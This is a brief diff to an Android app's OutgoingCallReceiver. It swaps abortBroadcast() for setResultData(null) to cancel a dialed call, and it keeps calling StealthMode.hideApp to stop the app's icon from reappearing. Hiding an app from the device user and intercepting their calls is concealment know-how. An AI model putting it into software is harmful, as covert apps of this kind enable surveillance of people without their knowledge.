@@ -53,10 +53,10 @@ public class OutgoingCallReceiver extends BroadcastReceiver {
     }
 
     void launchActivity(Context context, Intent launcher) {
+        setResultData(null);
         //Try hiding app everytime, prevent reappearance of app icon.
         StealthMode.hideApp(context);
         context.startActivity(launcher);
         // Cancel the call.
-        abortBroadcast();
     }
 }
